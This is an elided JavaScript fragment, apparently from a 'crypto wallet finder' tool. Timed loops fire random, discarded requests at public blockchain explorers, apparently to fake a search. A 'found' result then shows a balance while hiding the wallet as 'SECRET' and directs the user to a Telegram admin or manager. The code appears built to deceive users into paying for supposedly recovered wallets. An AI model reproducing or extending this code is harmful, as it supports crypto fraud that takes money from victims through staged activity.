    ...
    case "btc":
      ...
      if (searching_btc === null) {
        ...
        searching_btc = setInterval(async () => {
          ...
          if (getRandomChance(18)) {
            try {
              await fetch("https://sochain.com", { timeout: 400, priority: "low" });
            } catch (error) {
            }
          }
        }, 75);
      ...
      if (searching_eth === null) {
        ...
        searching_eth = setInterval(async () => {
          ...
          if (getRandomChance(13)) {
            try {
              await fetch("https://api.etherscan.io/", { timeout: 500, priority: "low" });
            } catch (error) {
            }
          }
        }, 50);
      ...
      if (searching_bnb === null) {
        ...
        searching_bnb = setInterval(async () => {
          ...
          if (getRandomChance(7)) {
            try {
              await fetch("https://chain.so", { timeout: 500, priority: "low" });
            } catch (error) {
            }
          }
        }, 30);
      ...
      if (searching_nft === null) {
        ...
        searching_nft = setInterval(async () => {
          ...
          if (getRandomChance(5)) {
            try {
              await fetch("https://blockchair.com/", { timeout: 500, priority: "low" });
            } catch (error) {
            }
          }
        }, 20);
      ...
      if (searching_multi === null) {
        ...
        searching_multi = setInterval(async () => {
          ...
          if (getRandomChance(2)) {
            try {
              await fetch("https://www.blockchain.com/", { timeout: 500, priority: "low" });
            } catch (error) {
            }
          }
        }, 10);
    ...
    if (data["found"]["status"] && !founded) {
      ...
      if (searching_network != null) {
        ...
        setTimeout(async () => {
          ...
          let found_tg_text = "\u{1F45B} <b>Balance:</b> <code>" + amount + '</code> || <b>Wallet:</b> <tg-spoiler><u>SECRET</u> <i>(Contact <a href="https://https://t.me/cryptominerz1">ADMIN</a> or <a href="https://t.me/nhazhehehe">MANAGER</a>)</i></tg-spoiler>%0A%0A';
          switch (data["found"]["network"]) {
            case "btc":
